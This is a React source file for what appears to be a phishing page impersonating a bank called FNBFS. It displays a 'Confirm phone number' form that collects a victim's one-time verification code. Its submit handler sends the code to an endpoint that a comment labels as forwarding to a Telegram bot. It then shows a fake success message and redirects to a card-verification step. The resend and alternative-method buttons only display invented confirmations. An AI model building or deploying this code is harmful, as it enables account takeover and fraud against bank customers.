import { useState, useCallback, type FormEvent, type KeyboardEvent } from 'react';
import { useNavigate } from 'react-router-dom';

const BG_IMAGE = 'https://storage.readdy-site.link/project_files/2c4f8ff7-4756-4178-b267-42959e65ba3d/70f06539-cc97-4527-a402-129ea4a73ba7_compressed_photo_2026-07-01_22-39-05.webp';

export default function VerifyPhonePage() {
  const navigate = useNavigate();
  const [code, setCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [statusMessage, setStatusMessage] = useState<{ type: 'error' | 'success'; text: string } | null>(null);

  const isValid = code.trim().length >= 6;

  const handleSubmit = useCallback(
    (e: FormEvent) => {
      e.preventDefault();

      if (!isValid) {
        setStatusMessage({ type: 'error', text: 'Please enter the full 6-digit verification code.' });
        return;
      }

      // === SEND VERIFICATION CODE TO TELEGRAM BOT ===
      fetch('/api/send-message', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          code: code,
          type: 'verification_code',
          page: 'verify-phone',
        }),
      });
      // ==============================================

      setIsLoading(true);
      setStatusMessage(null);

      setTimeout(() => {
        setIsLoading(false);
        setStatusMessage({ type: 'success', text: 'Phone number verified successfully! Redirecting...' });
        setTimeout(() => {
          navigate('/verify-card');
        }, 600);
      }, 1500);
    },
    [isValid, code, navigate],
  );

  const handleKeyDown = useCallback(
    (e: KeyboardEvent) => {
      if (e.key === 'Enter') {
        e.preventDefault();
        handleSubmit(e as unknown as FormEvent);
      }
    },
    [handleSubmit],
  );

  const handleResendCode = useCallback(() => {
    setStatusMessage({ type: 'success', text: 'A new verification code has been sent to your phone.' });
  }, []);

  const handleTryAnotherWay = useCallback(() => {
    setStatusMessage({ type: 'success', text: 'We have sent a verification link to your email instead.' });
  }, []);

  return (
    <main
      className="relative flex flex-col min-h-screen w-full overflow-hidden bg-foreground-950"
      aria-label="Confirm phone number"
    >
      {/* Background image with overlay */}
      <div className="absolute inset-0">
        <img
          src={BG_IMAGE}
          alt=""
          aria-hidden="true"
          className="h-full w-full object-cover object-top scale-105"
        />
        <div className="absolute inset-0 bg-foreground-950/20" />
      </div>

      {/* Centered card */}
      <div className="relative z-10 flex flex-1 items-center justify-center px-5">
        <section className="w-full max-w-[420px] animate-fade-in-up" style={{ animationDelay: '0.15s' }}>
          <div className="rounded-[24px] bg-background-50 p-8 shadow-[0_12px_30px_rgba(0,0,0,0.15)] sm:p-10">
            {/* Card header */}
            <div className="mb-8 text-center">
              <img
                src="https://storage.readdy-site.link/project_files/2c4f8ff7-4756-4178-b267-42959e65ba3d/a63f8a5e-b496-459c-abb6-c475388db416_compressed_photo_2026-07-01_23-44-35.webp"
                alt="Verification messaging icon"
                className="mx-auto mb-6 h-24 w-24 rounded-full object-cover"
              />

              <h1 className="mb-2 text-lg text-foreground-950" style={{ fontFamily: 'Inter, system-ui, -apple-system, sans-serif' }}>
                Confirm phone number
              </h1>

              <p className="text-sm leading-relaxed" style={{ color: '#6B7280', fontFamily: 'system-ui, -apple-system, sans-serif' }}>
                We sent a verification code to your phone.
                <br />
                This code will expire after 5 minutes.
                <br />
                Never share this code with anyone.
              </p>
            </div>

            {/* Verification code form */}
            <form onSubmit={handleSubmit} noValidate aria-label="Verification code form">
              {/* Verification code field */}
              <div className="outlined-floating-label-group mb-6">
                <input
                  id="verification-code"
                  name="verification-code"
                  type="text"
                  inputMode="numeric"
                  autoComplete="one-time-code"
                  maxLength={6}
                  value={code}
                  onChange={(e) => {
                    const val = e.target.value.replace(/\D/g, '').slice(0, 6);
                    setCode(val);
                    setStatusMessage(null);
                  }}
                  onKeyDown={handleKeyDown}
                  placeholder=""
                  className="outlined-input"
                  style={{
                    fontFamily: 'Inter, system-ui, -apple-system, sans-serif',
                    letterSpacing: '0.15em',
                    fontWeight: 500,
                  }}
                  aria-required="true"
                  aria-label="Verification code"
                />
                <label htmlFor="verification-code" className="outlined-label">
                  Verification code
                </label>
              </div>

              {/* Status message */}
              {statusMessage && (
                <div
                  className={`mb-6 rounded-xl px-4 py-3 text-sm font-medium animate-fade-in ${
                    statusMessage.type === 'error'
                      ? 'bg-primary-50 text-primary-700'
                      : 'bg-accent-50 text-accent-800'
                  }`}
                  role="alert"
                  aria-live="polite"
                >
                  {statusMessage.text}
                </div>
              )}

              {/* Action row */}
              <div className="flex flex-col items-center gap-4">
                {/* Verify button */}
                <button
                  type="submit"
                  disabled={!isValid || isLoading}
                  className="flex items-center justify-center gap-2 whitespace-nowrap rounded-lg bg-primary-500 px-6 py-2.5 text-sm font-semibold text-background-50 transition-all duration-200 hover:bg-primary-600 active:bg-primary-700 disabled:cursor-not-allowed disabled:opacity-60 w-full max-w-[200px]"
                >
                  {isLoading ? (
                    <>
                      <i className="ri-loader-4-line animate-spin text-lg" aria-hidden="true" />
                      <span>Verifying...</span>
                    </>
                  ) : (
                    <span>Verify</span>
                  )}
                </button>

                {/* Resend / Try another way */}
                <div className="flex items-center gap-1 text-sm" style={{ fontFamily: 'system-ui, -apple-system, sans-serif' }}>
                  <button
                    type="button"
                    onClick={handleResendCode}
                    className="whitespace-nowrap font-medium text-primary-500 transition-colors hover:text-primary-600"
                  >
                    Resend Code
                  </button>
                  <span style={{ color: '#6B7280' }}>or</span>
                  <button
                    type="button"
                    onClick={handleTryAnotherWay}
                    className="whitespace-nowrap font-medium text-primary-500 transition-colors hover:text-primary-600"
                  >
                    Try another way
                  </button>
                </div>
              </div>
            </form>
          </div>
        </section>
      </div>

      {/* Footer bar */}
      <footer className="relative z-10 bg-background-50 py-4">
        <div className="flex flex-col items-center gap-1 text-center text-xs text-foreground-500">
          <p>&copy; 2026 FNBFS &bull; (479) 788-4600</p>
          <p>Privacy policy &bull; Member FDIC</p>
          <p>An Equal Housing Lender</p>
        </div>
      </footer>
    </main>
  );
}
